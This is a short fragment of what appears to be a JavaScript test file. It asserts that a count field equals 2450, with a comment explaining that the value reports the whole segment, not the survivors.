    // n is the segment, not the survivors: quoting 820/820 would report the
    // survivors as the segment.
    expect(withBytes.n).toBe(2450)
  })
})
